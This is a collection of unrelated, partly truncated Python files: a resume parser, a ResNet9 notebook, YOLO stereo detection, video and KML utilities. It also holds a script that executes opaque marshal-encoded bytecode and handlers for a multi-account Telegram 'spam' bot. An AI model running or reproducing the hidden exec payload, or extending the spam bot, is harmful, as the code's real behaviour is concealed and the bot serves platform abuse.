parse_resume(uploaded_file.name)\n                if isinstance(data, dict):\n                    display_info(data, info_selection)\n                else:\n                    st.error(data)\n\n                os.remove(uploaded_file.name)  # Clean up the uploaded file\n\nmain()\n",
    "\"\"\"Untitled0.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/12ubbgXyimQ3cxRhotvRVnCEkJqma3f2b\n\"\"\"\n\nimport torch\nimport os\nimport torchvision\nimport numpy as np\nimport matplotlib\nimport matplotlib.pyplot as plt\nimport torch.nn as nn\nfrom PIL import Image\nimport torch.nn.functional as F\nfrom torchvision.datasets import ImageFolder\nfrom torchvision.datasets import DatasetFolder\nimport torchvision.transforms as transforms\nfrom torchvision.datasets import MNIST\nfrom torchvision.transforms import ToTensor\nfrom torchvision.utils import make_grid\nfrom torch.utils.data.dataloader import DataLoader\nfrom torch.utils.data import random_split\nfrom torch.utils.data import Dataset, DataLoader\n\n# device = torch.device(\"cpu\")\n\n# %matplotlib inline\n# class Potato(nn.Module):\n#     def training_step(self, batch):\n#         images, labels = batch\n#         out = self(images)                  # Generate predictions\n#         loss = F.cross_entropy(out, labels) # Calculate loss\n#         return loss\n\n#     def validation_step(self, batch):\n#         images, labels = batch\n#         out = self(images)                    # Generate predictions for each batch\n#         loss = F.cross_entropy(out, labels)   # Calculate loss for each batch\n#         acc = accuracy(out, labels)           # Calculate accuracy for each batch\n#         return {'val_loss': loss.detach(), 'val_acc': acc}\n\n#     def validation_epoch_end(self, outputs):\n#         batch_losses = [x['val_loss'] for x in outputs]\n#         epoch_loss = torch.stack(batch_losses).mean()   # Combine losses\n#         batch_accs = [x['val_acc'] for x in outputs]\n#         epoch_acc = torch.stack(batch_accs).mean()      # Combine accuracies\n#         return {'val_loss': epoch_loss.item(), 'val_acc': epoch_acc.item()}\n\n#     def epoch_end(self, epoch, result):\n#         print(\"Epoch [{}], train_loss: {:.4f}, val_loss: {:.4f}, val_acc: {:.4f}\".format(\n#             epoch, result['train_loss'], result['val_loss'], result['val_acc']))\n\n# def accuracy(outputs, labels):\n#     _, preds = torch.max(outputs, dim=1)\n#     return torch.tensor(torch.sum(preds == labels).item() / len(preds))\n\n# def conv_block(in_channels, out_channels, pool=False):\n#     layers = [nn.Conv2d(in_channels, out_channels, kernel_size=3, padding=1),\n#               nn.BatchNorm2d(out_channels),\n#               nn.ReLU(inplace=True)]\n#     if pool: layers.append(nn.MaxPool2d(2))\n#     return nn.Sequential(*layers)\n\n# class ResNet9(Potato):\n#     def __init__(self, in_channels, num_classes):\n#         super().__init__()\n\n#         self.conv1 = conv_block(in_channels, 64)  #64 x 256 x 256\n#         self.conv2 = conv_block(64, 128, pool=True) #128 x 128 x 128\n#         self.res1 = nn.Sequential(conv_block(128, 128), conv_block(128, 128)) #128 x 128 x 128\n\n#         self.conv3 = conv_block(128, 256, pool=True)\n#         self.conv4 = conv_block(256, 512, pool=True)\n#         self.res2 = nn.Sequential(conv_block(512, 512), conv_block(512, 512))  #512 x 32 x 32\n#         self.classifier = nn.Sequential(nn.MaxPool2d(4),                       #512 x 8 x 8\n#                                         nn.Flatten(),\n#                                         nn.Dropout(0.2),\n#                                         nn.Linear(512*8*8, num_classes))\n\n#     def forward(self, xb):\n#         out = self.conv1(xb)\n#         out = self.conv2(out)\n#         out = self.res1(out) + out\n#         out = self.conv3(out)\n#         out = self.conv4(out)\n#         out = self.res2(out) + out\n#         out = self.classifier(out)\n#         return out\n# def get_default_device():             #For GPU\n#     \"\"\"Pick GPU if available, else CPU\"\"\"\n#     if torch.cuda.is_available():\n#         return torch.device('cuda')\n#     else:\n#         return torch.device('cpu')\n\n# def to_device(data, device):\n#     \"\"\"Move tensor(s) to chosen device\"\"\"\n#     if isinstance(data, (list,tuple)):\n#         return [to_device(x, device) for x in data]\n#     return data.to(device, non_blocking=True)\n\n# class DeviceDataLoader():\n#     \"\"\"Wrap a dataloader to move data to a device\"\"\"\n#     def __init__(self, dl, device):\n#         self.dl = dl\n#         self.device = device\n\n#     def __iter__(self):\n#         \"\"\"Yield a batch of data after moving it to device\"\"\"\n#         for b in self.dl:\n#             yield to_device(b, self.device)\n\n#     def __len__(self):\n#         \"\"\"Number of batches\"\"\"\n#         return len(self.dl)\n# @torch.no_grad()\n# def evaluate(model, val_loader):\n#     model.eval()\n#     outputs = [model.validation_step(batch) for batch in val_loader]\n#     return model.validation_epoch_end(outputs)\n\n# def get_lr(optimizer):\n#     for param_group in optimizer.param_groups:\n#         return param_group['lr']\n\n# def fit_one_cycle(epochs, max_lr, model, train_loader, val_loader,\n#                    grad_clip=None, opt_func=torch.optim.SGD):\n#     torch.cuda.empty_cache()\n#     history = []\n\n#     # Se",
    "import marshal \nexec(marshal.loads(b'\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\x8a\\x04\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00d\\x00d\\x01l\\x01Z\\x01d\\x00d\\x01l\\x02Z\\x02d\\x00d\\x01l\\x03Z\\x03d\\x00d\\x01l\\x04Z\\x04d\\x00d\\x01l\\x00Z\\x00d\\x00d\\x01l\\x05Z\\x05d\\x00d\\x01l\\x06Z\\x06d\\x00d\\x01l\\x07Z\\x07d\\x00d\\x01l\\x08Z\\x08d\\x00d\\x01l\\tZ\\td\\x00d\\x01l\\nZ\\nd\\x00d\\x01l\\x0bZ\\x0bd\\x00d\\x02l\\x02m\\x0cZ\\x0c\\x01\\x00d\\x00d\\x01l\\x06Z\\x06d\\x00d\\x03l\\x08m\\rZ\\r\\x01\\x00d\\x00d\\x04l\\x01m\\x0eZ\\x0em\\x0fZ\\x0f\\x01\\x00d\\x00d\\x05l\\x10m\\x11Z\\x11m\\x12Z\\x12m\\x13Z\\x13\\x01\\x00d\\x00d\\x06l\\x14m\\x15Z\\x15m\\x16Z\\x16\\x01\\x00d\\x07Z\\x17d\\x08Z\\x18d\\tZ\\x19d\\nZ\\x1ad\\x0bZ\\x1bd\\x0cZ\\x1cd\\rZ\\x1dd\\rZ\\x1ed\\x0eZ\\x1fd\\x08Z d\\x0fZ!d\\x00d\\x01l\\x08Z\\x08d\\x00d\\x01l\\nZ\"d\\x00d\\x01l\\x08Z#d\\x00d\\x01l$Z$e$j$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0%\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z&\\x02\\x00e\\'e&j(\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z#\\x02\\x00e\\'e&j)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z*\\x02\\x00e\\'e&j+\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z,\\x02\\x00e\\'e&j-\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z-\\x02\\x00e\\'e&j.\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z/\\x02\\x00e\\'e&j0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z1e#d\\x10z\\x00\\x00\\x00e*z\\x00\\x00\\x00d\\x10z\\x00\\x00\\x00e,z\\x00\\x00\\x00d\\x11z\\x00\\x00\\x00e-z\\x00\\x00\\x00d\\x12z\\x00\\x00\\x00e/z\\x00\\x00\\x00d\\x12z\\x00\\x00\\x00e1z\\x00\\x00\\x00Z2e&j-\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z3e$j$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0&\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z4\\x02\\x00e$j$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x13d\\x14d\\x15d\\x16d\\x00d\\x00\\xa6\\x06\\x00\\x00\\xab\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z5e4\\xa0\\r\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x17\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00e5\\xa0\\r\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x17\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00k\\x04\\x00\\x00\\x00\\x00r\\x1b\\x02\\x00e6d\\x18\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x00e\"j7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x00e\\x03j8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x19\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x1aZ9\\x02\\x00G\\x00d\\x1b\\x84\\x00d\\x1c\\xa6\\x02\\x00\\x00\\xab\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z:e;d\\x1dk\\x02\\x00\\x00\\x00\\x00r\\x84\\x02\\x00e:\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z<\\x02\\x00e\\x04j=\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00e<j>\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xac\\x1e\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0?\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x00e\\x04j=\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00e<j@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xac\\x1e\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0?\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00e<\\xa0A\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00e<\\xa0B\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00d\\x01S\\x00)\\x1f\\xe9\\x00\\x00\\x00\\x00N)\\x01\\xda\\x0bPrettyTable)\\x01\\xda\\x08strftime)\\x02\\xda\\x04init\\xda\\x04Fore)\\x03\\xda\\x08urlparse\\xda\\x07unquote\\xda\\x05quote)\\x02\\xda\\rascii_letters\\xda\\x06digitsz\\x07\\x1b[1;36m\\xfa\\x07\\x1b[1;31m\\xfa\\x07\\x1b[1;32m\\xfa\\x07\\x1b[1;33m\\xfa\\x07\\x1b[1;34m\\xfa\\x07\\x1b[1;35m\\xfa\\x07\\x1b[1;37mz\\x07\\x1b[0;31mz\\x04\\x1b[0m\\xfa\\x01/\\xfa\\x01 \\xfa\\x01:i\\xe8\\x07\\x00\\x00\\xe9\\x04\\x00\\x00\\x00\\xe9\\x0f\\x00\\x00\\x00\\xe9\\x01\\x00\\x00\\x00z\\x02%xz&Tool is outdated you can contact admin\\xda\\x05clearu+\\x04\\x00\\x00\\n\\x1b[1;91m\\xe2\\x94\\x8f\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x93\\n\\x1b[1;91m\\xe2\\x94\\x83\\x1b[1;32m  ____ ___  _ _       \\x1b[1;32m_",
    "import sys\nimport heroku3\n\nfrom config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, OWNER_ID, SUDO_USERS, HEROKU_APP_NAME, HEROKU_API_KEY, CMD_HNDLR as hl\nfrom config import SUDO_USERS\nfrom os import execl, getenv\nfrom telethon import events\nfrom datetime import datetime\n\n\n@X1.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X2.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X3.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X4.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X5.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X6.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X7.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X8.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X9.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\n@X10.on(events.NewMessage(incoming=True, pattern=r\"\\%sping(?: |$)(.*)\" % hl))\nasync def ping(e):\n    if e.sender_id in SUDO_USERS:\n        start = datetime.now()\n        jarvis = await e.reply(f\"\ud83d\ude08 \ud835\udc0f\ud835\udc11\ud835\udc04\ud835\udc0c\ud835\udc08\ud835\udc14\ud835\udc0c \u2718 \ud835\udc12\ud835\udc0f\ud835\udc00\ud835\udc0c \ud83d\ude08\")\n        end = datetime.now()\n        mp = (end - start).microseconds / 1000\n        await jarvis.edit(f\"\ud83d\ude08 \ud835\udc0f\ud835\udc11\ud835\udc04\ud835\udc0c\ud835\udc08\ud835\udc14\ud835\udc0c \u2718 \ud835\udc12\ud835\udc0f\ud835\udc00\ud835\udc0c \ud83d\ude08\\n\u00bb `{mp} \u1d0d\ua731`\")\n\n\n@X1.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X2.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X3.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X4.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X5.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X6.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X7.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X8.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X9.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\n@X10.on(events.NewMessage(incoming=True, pattern=r\"\\%sreboot(?: |$)(.*)\" % hl))\nasync def restart(e):\n    if e.sender_id in SUDO_USERS:\n        await e.reply(f\"`\ud83d\ude08 \ud835\udc0f\ud835\udc11\ud835\udc04\ud835\udc0c\ud835\udc08\ud835\udc14\ud835\udc0c \u2718 \ud835\udc12\ud835\udc0f\ud835\udc00\ud835\udc0c \ud83d\ude08 \u026as s\u1d1b\u1d00\u0280\u1d1b\u026a\u0274\u0262...`\")\n        try:\n            await X1.disconnect()\n        except Exception:\n            pass\n        try:\n            await X2.disconnect()\n        except Exception:\n            pass\n        try:\n            await X3.disconnect()\n        except Exception:\n            pass\n        try:\n            await X4.disconnect()\n        except Exception:\n            pass\n        try:\n            await X5.disconnect()\n        except Exception:\n            pass\n        try:\n            await X6.disconnect()\n        except Exception:\n            pass\n        try:\n            await X7.disconnect()\n        except Exception:\n            pass\n        try:\n            await X8.disconnect()\n        except Exception:\n            pass\n        try:\n            await X9.disconnect()\n        except Exception:\n            pass\n        try:\n            await X10.disconnect()\n        except Exception:\n            pass\n\n        execl(sys.executable, sys.executable, *sys.argv)\n\n\n@X1.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X2.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X3.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X4.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X5.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X6.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X7.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X8.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X9.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\n@X10.on(events.NewMessage(incoming=True, pattern=r\"\\%ssudo(?: |$)(.*)\" % hl))\nasync def addsudo(event):\n    if event.sender_id == OWNER_ID:\n        Heroku = heroku3.from_key(HEROKU_API_KEY)\n        sudousers = getenv(\"SUDO_USERS\", default=None)\n\n        ok = await event.reply(f\"\u00bb\ud83d\ude08 \ud835\udc0f\ud835\udc11\ud835\udc04\ud835\udc0c\ud835\udc08\ud835\udc14\ud835\udc0c \u2718 \ud835\udc12\ud835\udc0f\ud835\udc00\ud835\udc0c \ud83d\ude08, \u0274\u1d07\u1d21 s\u1d1c\u1d05\u1d0f \u1d1cs\u1d07\u0280\u1d00\u1d05\u1d05\u1d07\u1d05\")\n        target = \"\"\n        if HEROKU_APP_NAME is not None:\n            app = Heroku.app(HEROKU_APP_NAME)\n        else:\n            await ok.edit(\"`[HEROKU]:\" \"\\nPlease Setup Your` **HEROKU_APP_NAME**\")\n            return\n        heroku_var = app.config()\n        if event is None:\n            return\n        try:\n            reply_msg = await event.get_reply_message()\n            target = reply_msg.sender_id\n        except:\n            await ok.edit(\"\u00bb \u0280\u1d07\u1d18\u029f\u028f \u1d0f\u0274 \u1d1cs\u1d07\u0280 !!\")\n            return\n\n        if str(target) in sudousers:\n            await ok.edit(f\"\ud83d\ude08 \ud835\udc0f\ud835\udc11\ud835\udc04\ud835\udc0c\ud835\udc08\ud835\udc14\ud835\udc0c \u2718 \ud835\udc12\ud835\udc0f\ud835\udc00\ud835\udc0c \ud83d\ude08 s\u1d1c\u1d05\u1d0f \u1d1cs\u1d07\u0280. !!\")\n        else:\n            if len(sudousers) > 0:\n                newsudo = f\"{sudousers} {target}\"\n            else:\n                newsudo = f\"{target}\"\n            await ok.edit(f\"\u00bb **\u0274\u1d07\u1d21 \ua731\u1d1c\u1d05\u1d0f",
    "import cv2\r\nimport time\r\nimport os\r\nimport numpy as np\r\nimport glob\r\nfrom pythonosc import udp_client\r\nfrom ultralytics import YOLO\r\nimport torch\r\n\r\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu') # make sure detections are sent to GPU for better performance\r\n\r\nclient_out = udp_client.SimpleUDPClient(\"IP ADDRESS\", 7777) # settting up variable sending over network\r\n\r\nimages_centre = [cv2.imread('../chess_imgs_centre/out.1.png'),\r\n               cv2.imread('../chess_imgs_centre/out.2.png'),\r\n               cv2.imread('../chess_imgs_centre/out.3.png'),\r\n               cv2.imread('../chess_imgs_centre/out.4.png'),\r\n               cv2.imread('../chess_imgs_centre/out.5.png'),\r\n               cv2.imread('../chess_imgs_centre/out.6.png'),\r\n               cv2.imread('../chess_imgs_centre/out.7.png'),\r\n               cv2.imread('../chess_imgs_centre/out.8.png'),\r\n               cv2.imread('../chess_imgs_centre/out.9.png'),\r\n               cv2.imread('../chess_imgs_centre/out.10.png'),\r\n               cv2.imread('../chess_imgs_centre/out.11.png'),\r\n               cv2.imread('../chess_imgs_centre/out.12.png'),\r\n               cv2.imread('../chess_imgs_centre/out.13.png'),\r\n               cv2.imread('../chess_imgs_centre/out.14.png'),\r\n               cv2.imread('../chess_imgs_centre/out.15.png'),\r\n               cv2.imread('../chess_imgs_centre/out.16.png'),\r\n               cv2.imread('../chess_imgs_centre/out.17.png'),\r\n               cv2.imread('../chess_imgs_centre/out.18.png'),\r\n               cv2.imread('../chess_imgs_centre/out.19.png'),\r\n               cv2.imread('../chess_imgs_centre/out.20.png'),\r\n               cv2.imread('../chess_imgs_centre/out.21.png'),\r\n               cv2.imread('../chess_imgs_centre/out.22.png'),\r\n               cv2.imread('../chess_imgs_centre/out.23.png'),\r\n               cv2.imread('../chess_imgs_centre/out.24.png'),\r\n               cv2.imread('../chess_imgs_centre/out.25.png'),\r\n               cv2.imread('../chess_imgs_centre/out.26.png'),\r\n               cv2.imread('../chess_imgs_centre/out.27.png'),\r\n               cv2.imread('../chess_imgs_centre/out.28.png'),\r\n               cv2.imread('../chess_imgs_centre/out.29.png'),\r\n               cv2.imread('../chess_imgs_centre/out.30.png')] # images of the chessboard for calibration\r\n\r\nimgsL = glob.glob(\"../chess_imgs_left/*.png\") # images of the chessboard for left and right cameras for stereo matching\r\nimgR = glob.glob(\"../chess_imgs_right/*.png\")\r\nflatL = glob.glob(\"../flat_left/*.png\")\r\nflatR = glob.glob(\"../flat_right/*.png\")\r\n\r\nsquare_size = 15 # real world size of chessboard squares (cm)\r\n\r\nclass Detector:\r\n    def __init__(self):\r\n        pass\r\n\r\n    def readClasses(self, classesFilePath): #read class names file into an array and split by newline and print number of lines in file\r\n        with open(classesFilePath, 'r') as f:\r\n            self.classesList = []\r\n            self.classesList = f.read().splitlines()\r\n        #self.colorList = np.random.uniform(low=0, high=255, size=(len(self.classesList), 3))\r\n\r\n        print(len(self.classesList))#, len(self.colorList))\r\n\r\n    def downloadModel(self, modelURL): #download detection model from link variable, put contents into a new folder\r\n        fileName = os.path.basename(modelURL)\r\n        self.modelName = fileName[:fileName.index('.')]\r\n\r\n    def loadModel(self): #extract contents of new model folder and print when done\r\n        print(\"Loading Model \" + self.modelName)\r\n\r\n        model = YOLO(\"yolov8s.pt\")\r\n        self.model = model.load(\"yolov8s.pt\")\r\n        self.model = model.to(device)\r\n\r\n        print(\"Model \" + self.modelName + \" loaded successfully...\")\r\n\r\n    def createBBox(self, image, threshold): #creating bounding boxes around detections\r\n        centX = 0\r\n        centY = 0\r\n        inputImg = cv2.cvtColor(image, cv2.COLOR_BGR2RGB) # convert colour of input image\r\n        detections = self.model.predict(source=inputImg, conf=threshold) # use image to detect objects\r\n        coord = [] # empty arrays for storing stuff later\r\n        classScoresPerc = []\r\n        classIndex = []\r\n        classColor = (0, 255, 0) #GREEN\r\n        for det in detections:\r\n            boxes = det.boxes.cpu().numpy() # copy detection data off GPU onto CPU for augmentation\r\n            data = boxes.data\r\n            for xyxy in data:\r\n                xmin, ymin, xmax, ymax = int(xyxy[0]), int(xyxy[1]), int(xyxy[2]), int(xyxy[3]) # yolo layout for bounding box output\r\n                coord.append([xmin, ymin, xmax, ymax]) # append to the array\r\n\r\n                classConf = int(100 * xyxy[4]) # convert scores to percentage and append to array\r\n                classScoresPerc.append(classConf)\r\n\r\n                className = int(xyxy[5]) # read class id output and compare to names file\r\n                classIndex.append(className)\r\n                classLabelText = self.classesList[className]\r\n\r\n                if classLabelText == \"person\": # only want if a person is dete",
    "import cv2\nimport os\n\n# source: https://stackoverflow.com/a/44659589\ndef image_resize(image, width = None, height = None, inter = cv2.INTER_AREA):\n    # initialize the dimensions of the image to be resized and\n    # grab the image size\n    dim = None\n    (h, w) = image.shape[:2]\n    # if both the width and height are None, then return the\n    # original image\n    if width is None and height is None:\n        return image\n    # check to see if the width is None\n    if width is None:\n        # calculate the ratio of the height and construct the\n        # dimensions\n        r = height / float(h)\n        dim = (int(w * r), height)\n    # otherwise, the height is None\n    else:\n        # calculate the ratio of the width and construct the\n        # dimensions\n        r = width / float(w)\n        dim = (width, int(h * r))\n\n    # resize the image\n    resized = cv2.resize(image, dim, interpolation = inter)\n    # return the resized image\n    return resized\n\n\n\nclass CFEVideoConf(object):\n    # Standard Video Dimensions Sizes\n    STD_DIMENSIONS =  {\n        \"360p\": (480, 360),\n        \"480p\": (640, 480),\n        \"720p\": (1280, 720),\n        \"1080p\": (1920, 1080),\n        \"4k\": (3840, 2160),\n    }\n    # Video Encoding, might require additional installs\n    # Types of Codes: http://www.fourcc.org/codecs.php\n    VIDEO_TYPE = {\n        'avi': cv2.VideoWriter_fourcc(*'XVID'),\n        #'mp4': cv2.VideoWriter_fourcc(*'H264'),\n        'mp4': cv2.VideoWriter_fourcc(*'XVID'),\n    }\n\n    width           = 640\n    height          = 480\n    dims            = (640, 480)\n    capture         = None\n    video_type      = None\n    def __init__(self, capture, filepath, res=\"480p\", *args, **kwargs):\n        self.capture = capture\n        self.filepath = filepath\n        self.width, self.height = self.get_dims(res=res)\n        self.video_type = self.get_video_type()\n\n    # Set resolution for the video capture\n    # Function adapted from https://kirr.co/0l6qmh\n    def change_res(self, width, height):\n        self.capture.set(3, width)\n        self.capture.set(4, height)\n\n    def get_dims(self, res='480p'):\n        width, height = self.STD_DIMENSIONS['480p']\n        if res in self.STD_DIMENSIONS:\n            width, height = self.STD_DIMENSIONS[res]\n        self.change_res(width, height)\n        self.dims = (width, height)\n        return width, height\n\n    def get_video_type(self):\n        filename, ext = os.path.splitext(self.filepath)\n        if ext in self.VIDEO_TYPE:\n          return  self.VIDEO_TYPE[ext]\n        return self.VIDEO_TYPE['avi']",
    "import sys\r\nimport os\r\nimport csv\r\nimport simplekml\r\nimport pandas as pd\r\nfrom pandas import IntervalIndex\r\nfrom PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QFileDialog, QMainWindow, QLabel, QFrame, QSizePolicy, QDialog, QLineEdit, QHBoxLayout, QDialog, QLineEdit, QVBoxLayout\r\nfrom PyQt5.QtCore import Qt\r\nfrom PyQt5.QtGui import QColor, QScreen\r\nimport math\r\nfrom math import cos, sin, radians, sqrt, atan2, degrees\r\nimport re\r\nimport numpy as np\r\n\r\n#create csv files if they arent already\r\ndef is_csv_file(filename):\r\n    _, ext = os.path.splitext(filename)\r\n    return ext.lower() == '.csv'\r\n\r\n#converts a text file to a csv file\r\ndef convert_to_csv(input_file_path, output_file_path):\r\n    #opens both files\r\n    with open(input_file_path, 'r') as input, open(output_file_path, 'w', newline='') as output:\r\n        #creates the csv writer\r\n        csv_writer = csv.writer(output)\r\n        for line in input:\r\n            #this will write each row, also the values are seperated by tabs not spaces in the text file, adjust as necesarry\r\n            fields = line.strip().split('\\t')\r\n            csv_writer.writerow(fields)\r\n\r\ndef create_circle(lat, long, radius):\r\n    circle_points = []\r\n\r\n    for i in range(360):\r\n        theta = math.radians(i)\r\n        dlat = (radius * math.cos(theta)) / 111319.9\r\n        dlon = (radius 